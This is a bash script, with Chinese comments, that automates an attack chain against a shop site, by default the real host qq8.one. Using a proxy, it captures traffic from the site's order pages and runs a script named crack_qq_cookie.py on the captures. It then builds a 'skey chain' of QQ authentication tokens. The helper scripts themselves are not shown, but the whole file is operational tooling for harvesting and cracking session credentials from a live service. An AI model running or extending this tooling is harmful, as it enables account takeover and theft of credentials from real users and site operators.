#!/bin/bash
# 彩虹自动抓包 + skey 链 — 替代 auto_capture_qq8.sh
set -euo pipefail
FAKA=/data/tools/faka
HOST="${1:-qq8.one}"
PATH_BASE="${2:-/}"
CONTACT="${3:-}"
source "$FAKA/cookie/use_proxy.sh"

ARGS=(python3 "$FAKA/cookie/auto_capture_showorder.py" "$HOST" "$PATH_BASE" --proxy auto --feed-order)
[ -n "$CONTACT" ] && ARGS+=(--contact "$CONTACT")
"${ARGS[@]}"

LATEST=$(ls -td /data/tools/faka/out/captures/"$HOST"/*/ 2>/dev/null | head -1)
if [ -n "$LATEST" ]; then
  python3 "$FAKA/cookie/crack_qq_cookie.py" --input "$LATEST" --out "$LATEST/crack_report.json" || true
  python3 "$FAKA/skey_chain.py" -H "$HOST" --base-path "$PATH_BASE" --body-dir "$LATEST" --skip-harvest --proxy auto ${CONTACT:+--contact "$CONTACT"}
fi
echo "latest: $LATEST"
